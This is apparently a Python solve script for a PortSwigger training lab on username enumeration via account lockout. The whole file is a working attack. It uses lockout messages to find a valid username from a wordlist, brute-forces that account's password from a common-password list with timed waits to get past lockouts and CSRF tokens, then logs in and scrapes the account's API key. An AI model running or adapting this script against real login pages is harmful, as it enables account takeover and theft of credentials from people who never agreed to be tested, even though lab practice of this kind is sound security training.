#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Username enumeration via account lock.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAMES = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator",
             "oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico",
             "acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit",
             "admin","administracion","administrador","administrator","administrators","admins",
             "ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda",
             "agent","agents","ai","aix","ajax","ak","akamai","al","al","alabama","alaska"]

PASSWORDS = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
             "dragon","123123","baseball","iloveyou","trustno1","1234567890","sunshine","master",
             "123321","letmein","welcome","shadow","monkey","football","michael","batman","abc123"]


def get_csrf(session, url):
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def find_username(lab, usernames):
    for username in usernames:
        s = requests.Session()
        s.verify = False
        for _ in range(5):
            csrf = get_csrf(s, f"{lab}/login")
            s.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": "wrong"})
        r = s.post(f"{lab}/login", data={"csrf": get_csrf(s, f"{lab}/login"),
                                          "username": username, "password": "wrong"})
        if "too many incorrect login attempts" in r.text.lower():
            print(f"[+] Valid username found: {username}")
            return username
    return None


def brute_password(lab, username, passwords):
    for password in passwords:
        s = requests.Session()
        s.verify = False
        csrf = get_csrf(s, f"{lab}/login")
        r = s.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password},
                   allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Password found: {password}")
            return password
        if "too many incorrect login attempts" in r.text.lower():
            time.sleep(60)
    return None


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 7 (account lock enum)")
    parser.add_argument("lab_url")
    args = parser.parse_args()
    lab = args.lab_url.rstrip("/")

    username = find_username(lab, USERNAMES)
    if not username:
        raise SystemExit("[-] Username not found")

    print("[*] Waiting 65s for lockout to expire...")
    time.sleep(65)

    password = brute_password(lab, username, PASSWORDS)
    if not password:
        raise SystemExit("[-] Password not found")

    s = requests.Session()
    s.verify = False
    csrf = get_csrf(s, f"{lab}/login")
    s.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    r = s.get(f"{lab}/my-account")
    m = re.search(r"Your API Key is: ([^<]+)", r.text)
    if m:
        print(f"[+] API Key: {m.group(1).strip()}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
